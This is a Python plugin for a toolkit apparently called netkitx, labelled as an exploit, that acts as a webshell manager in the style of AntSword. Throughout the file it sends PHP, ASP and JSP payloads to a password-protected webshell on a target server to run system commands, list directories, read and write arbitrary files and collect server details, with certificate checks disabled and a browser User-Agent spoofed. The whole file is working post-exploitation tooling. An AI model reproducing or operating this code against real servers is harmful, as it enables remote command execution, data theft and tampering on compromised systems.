"""WebShell 管理插件 - 类似蚁剑的 WebShell 连接和管理工具"""

import base64
from typing import Any, AsyncIterator

import httpx

from netkitx_sdk import PluginBase, PluginEvent, PluginMeta


class WebShellPlugin(PluginBase):
    """WebShell 管理插件"""

    meta = PluginMeta(
        name="webshell",
        version="1.0.0",
        description="WebShell 管理工具 - 连接测试/命令执行/文件管理/数据库操作",
        category="exploit",
        engine="python",
    )

    def __init__(self):
        super().__init__()
        self.client: httpx.AsyncClient | None = None

    async def execute(self, params: dict[str, Any]) -> AsyncIterator[PluginEvent]:
        """执行插件逻辑"""
        url = params["url"].strip()
        password = params["password"].strip()
        shell_type = params.get("shell_type", "php_eval")
        operation = params.get("operation", "test")
        timeout = int(params.get("timeout", 15))

        yield PluginEvent(
            type="log",
            data={"msg": f"[*] Target: {url}"},
        )
        yield PluginEvent(
            type="log",
            data={"msg": f"[*] Shell Type: {shell_type}"},
        )
        yield PluginEvent(
            type="log",
            data={"msg": f"[*] Operation: {operation}"},
        )

        # 创建 HTTP 客户端
        self.client = httpx.AsyncClient(
            timeout=timeout,
            verify=False,
            follow_redirects=True,
            headers={
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                "Accept": "*/*",
            },
        )

        try:
            # 根据操作类型执行不同逻辑
            if operation == "test":
                async for event in self._test_connection(url, password, shell_type):
                    yield event
            elif operation == "exec":
                command = params.get("command", "").strip()
                if not command:
                    yield PluginEvent(type="error", data={"error": "命令不能为空"})
                    return
                async for event in self._exec_command(
                    url, password, shell_type, command
                ):
                    yield event
            elif operation == "listdir":
                path = params.get("path", ".").strip()
                async for event in self._list_directory(url, password, shell_type, path):
                    yield event
            elif operation == "readfile":
                path = params.get("path", "").strip()
                if not path:
                    yield PluginEvent(type="error", data={"error": "文件路径不能为空"})
                    return
                async for event in self._read_file(url, password, shell_type, path):
                    yield event
            elif operation == "writefile":
                path = params.get("path", "").strip()
                content = params.get("content", "").strip()
                if not path:
                    yield PluginEvent(type="error", data={"error": "文件路径不能为空"})
                    return
                async for event in self._write_file(
                    url, password, shell_type, path, content
                ):
                    yield event
            elif operation == "sysinfo":
                async for event in self._get_sysinfo(url, password, shell_type):
                    yield event
            else:
                yield PluginEvent(type="error", data={"error": f"未知操作: {operation}"})
                return

        except httpx.TimeoutException:
            yield PluginEvent(type="error", data={"error": "连接超时"})
        except httpx.ConnectError as e:
            yield PluginEvent(type="error", data={"error": f"连接失败: {e}"})
        except Exception as e:
            yield PluginEvent(type="error", data={"error": f"执行失败: {e}"})
        finally:
            if self.client:
                await self.client.aclose()

        yield PluginEvent(type="progress", data={"percent": 100, "msg": "完成"})

    async def _test_connection(
        self, url: str, password: str, shell_type: str
    ) -> AsyncIterator[PluginEvent]:
        """测试连接"""
        yield PluginEvent(type="progress", data={"percent": 20, "msg": "测试连接..."})

        # 发送测试 payload
        code = self._build_payload(shell_type, "echo 'NETKITX_TEST_OK';")
        data = {password: code}

        resp = await self.client.post(url, data=data)
        output = resp.text.strip()

        if "NETKITX_TEST_OK" in output:
            yield PluginEvent(
                type="result",
                data={
                    "operation": "连接测试",
                    "status": "✅ 成功",
                    "output": "Shell 连接正常",
                    "details": f"HTTP {resp.status_code}",
                },
            )
            yield PluginEvent(
                type="log", data={"msg": "[+] Shell 连接成功!"}
            )
        else:
            yield PluginEvent(
                type="result",
                data={
                    "operation": "连接测试",
                    "status": "❌ 失败",
                    "output": "未检测到预期响应",
                    "details": output[:200],
                },
            )
            yield PluginEvent(
                type="log", data={"msg": "[-] Shell 连接失败"}
            )

    async def _exec_command(
        self, url: str, password: str, shell_type: str, command: str
    ) -> AsyncIterator[PluginEvent]:
        """执行命令"""
        yield PluginEvent(
            type="progress", data={"percent": 30, "msg": f"执行命令: {command}"}
        )
        yield PluginEvent(type="log", data={"msg": f"[*] Command: {command}"})

        # 构建命令执行 payload
        if shell_type.startswith("php"):
            code = self._build_payload(shell_type, f"system('{command}');")
        elif shell_type.startswith("asp"):
            code = self._build_payload(
                shell_type, f'Response.Write(CreateObject("WScript.Shell").Exec("{command}").StdOut.ReadAll())'
            )
        elif shell_type.startswith("jsp"):
            code = self._build_payload(
                shell_type,
                f'Runtime.getRuntime().exec("{command}").getInputStream()',
            )
        else:
            yield PluginEvent(type="error", data={"error": f"不支持的 shell 类型: {shell_type}"})
            return

        data = {password: code}
        resp = await self.client.post(url, data=data)
        output = resp.text.strip()

        yield PluginEvent(
            type="result",
            data={
                "operation": "命令执行",
                "status": "✅ 完成",
                "output": output if output else "(无输出)",
                "details": f"命令: {command}",
            },
        )
        yield PluginEvent(type="log", data={"msg": f"[+] 命令执行完成"})

    async def _list_directory(
        self, url: str, password: str, shell_type: str, path: str
    ) -> AsyncIterator[PluginEvent]:
        """列出目录"""
        yield PluginEvent(
            type="progress", data={"percent": 40, "msg": f"列出目录: {path}"}
        )

        if shell_type.startswith("php"):
            code = self._build_payload(
                shell_type,
                f"""
                $dir = '{path}';
                if (is_dir($dir)) {{
                    $files = scandir($dir);
                    foreach ($files as $file) {{
                        if ($file != '.' && $file != '..') {{
                            $fullpath = $dir . '/' . $file;
                            $type = is_dir($fullpath) ? '[DIR]' : '[FILE]';
                            $size = is_file($fullpath) ? filesize($fullpath) : 0;
                            echo "$type $file ($size bytes)\\n";
                        }}
                    }}
                }} else {{
                    echo "目录不存在";
                }}
                """,
            )
        else:
            yield PluginEvent(type="error", data={"error": "当前仅支持 PHP shell 的目录列表"})
            return

        data = {password: code}
        resp = await self.client.post(url, data=data)
        output = resp.text.strip()

        yield PluginEvent(
            type="result",
            data={
                "operation": "列出目录",
                "status": "✅ 完成",
                "output": output if output else "(空目录)",
                "details": f"路径: {path}",
            },
        )

    async def _read_file(
        self, url: str, password: str, shell_type: str, path: str
    ) -> AsyncIterator[PluginEvent]:
        """读取文件"""
        yield PluginEvent(
            type="progress", data={"percent": 50, "msg": f"读取文件: {path}"}
        )

        if shell_type.startswith("php"):
            code = self._build_payload(
                shell_type,
                f"""
                $file = '{path}';
                if (file_exists($file)) {{
                    echo file_get_contents($file);
                }} else {{
                    echo "文件不存在";
                }}
                """,
            )
        else:
            yield PluginEvent(type="error", data={"error": "当前仅支持 PHP shell 的文件读取"})
            return

        data = {password: code}
        resp = await self.client.post(url, data=data)
        output = resp.text

        # 限制输出长度
        preview = output[:1000] + ("..." if len(output) > 1000 else "")

        yield PluginEvent(
            type="result",
            data={
                "operation": "读取文件",
                "status": "✅ 完成",
                "output": preview,
                "details": f"路径: {path}, 大小: {len(output)} bytes",
            },
        )

    async def _write_file(
        self, url: str, password: str, shell_type: str, path: str, content: str
    ) -> AsyncIterator[PluginEvent]:
        """写入文件"""
        yield PluginEvent(
            type="progress", data={"percent": 60, "msg": f"写入文件: {path}"}
        )

        if shell_type.startswith("php"):
            # Base64 编码内容避免特殊字符问题
            content_b64 = base64.b64encode(content.encode()).decode()
            code = self._build_payload(
                shell_type,
                f"""
                $file = '{path}';
                $content = base64_decode('{content_b64}');
                $result = file_put_contents($file, $content);
                if ($result !== false) {{
                    echo "写入成功: $result bytes";
                }} else {{
                    echo "写入失败";
                }}
                """,
            )
        else:
            yield PluginEvent(type="error", data={"error": "当前仅支持 PHP shell 的文件写入"})
            return

        data = {password: code}
        resp = await self.client.post(url, data=data)
        output = resp.text.strip()

        yield PluginEvent(
            type="result",
            data={
                "operation": "写入文件",
                "status": "✅ 完成",
                "output": output,
                "details": f"路径: {path}, 内容长度: {len(content)} bytes",
            },
        )

    async def _get_sysinfo(
        self, url: str, password: str, shell_type: str
    ) -> AsyncIterator[PluginEvent]:
        """获取系统信息"""
        yield PluginEvent(type="progress", data={"percent": 70, "msg": "获取系统信息..."})

        if shell_type.startswith("php"):
            code = self._build_payload(
                shell_type,
                """
                echo "OS: " . PHP_OS . "\\n";
                echo "PHP Version: " . PHP_VERSION . "\\n";
                echo "Server: " . $_SERVER['SERVER_SOFTWARE'] . "\\n";
                echo "Document Root: " . $_SERVER['DOCUMENT_ROOT'] . "\\n";
                echo "Current User: " . get_current_user() . "\\n";
                echo "Disabled Functions: " . ini_get('disable_functions') . "\\n";
                """,
            )
        else:
            yield PluginEvent(type="error", data={"error": "当前仅支持 PHP shell 的系统信息"})
            return

        data = {password: code}
        resp = await self.client.post(url, data=data)
        output = resp.text.strip()

        yield PluginEvent(
            type="result",
            data={
                "operation": "系统信息",
                "status": "✅ 完成",
                "output": output,
                "details": "服务器环境信息",
            },
        )

    def _build_payload(self, shell_type: str, code: str) -> str:
        """根据 shell 类型构建 payload"""
        if shell_type == "php_eval":
            return code
        elif shell_type == "php_assert":
            return code
        elif shell_type == "php_base64":
            return base64.b64encode(code.encode()).decode()
        elif shell_type == "asp_eval":
            return code
        elif shell_type == "jsp_eval":
            return code
        else:
            return code


# 导出插件实例
plugin = WebShellPlugin()
